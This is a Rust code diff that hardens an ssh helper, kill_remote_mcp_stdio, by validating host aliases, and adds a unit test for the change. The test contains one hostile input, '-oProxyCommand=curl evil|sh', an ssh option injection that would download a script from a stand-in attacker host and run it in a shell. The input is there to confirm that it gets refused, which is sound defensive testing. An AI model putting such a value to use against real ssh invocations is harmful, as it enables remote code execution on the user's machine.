@@ -213,6 +213,17 @@ mod host_alias_tests {
     fn rejects_pipe() { assert!(!is_valid_host_alias("a|b")); }
     #[test]
     fn rejects_newline() { assert!(!is_valid_host_alias("a\nb")); }
+
+    // kill_remote_mcp_stdio is the one ssh site that previously had no
+    // boundary validator (Issue #52 follow-up). An unsafe alias must be
+    // refused *before* any ssh spawn — this case returns early without
+    // touching the network, so it is safe to assert in a unit test.
+    #[test]
+    fn kill_remote_mcp_stdio_refuses_option_injection() {
+        let r = super::kill_remote_mcp_stdio("-oProxyCommand=curl evil|sh");
+        assert!(!r.ok);
+        assert!(r.message.contains("Refusing unsafe host alias"));
+    }
 }
 
 // Note: an earlier version of aiui patched ~/.ssh/config with a
@@ -820,6 +831,20 @@ print("ok:patched")
 /// 1 = nothing matched. Both are success from our perspective; only
 /// the SSH layer or shell-not-found counts as a real failure.
 pub fn kill_remote_mcp_stdio(host_alias: &str) -> StepResult {
+    // Defense-in-depth: like every other remote helper, refuse an unsafe
+    // alias before spawning ssh. The `--` below already keeps host_alias
+    // out of ssh option position, but this was the only ssh call site that
+    // relied on `--` alone — adding the validator restores the "every
+    // remote helper validates at its boundary" invariant (Issue #52
+    // follow-up). host_alias here comes from remotes.json, so this is
+    // belt-and-suspenders rather than a live hole.
+    if !is_valid_host_alias(host_alias) {
+        return StepResult {
+            ok: false,
+            message: format!("Refusing unsafe host alias '{host_alias}'"),
+            details: None,
+        };
+    }
     let out = no_window(
         std::process::Command::new("ssh").args([
             "-o",
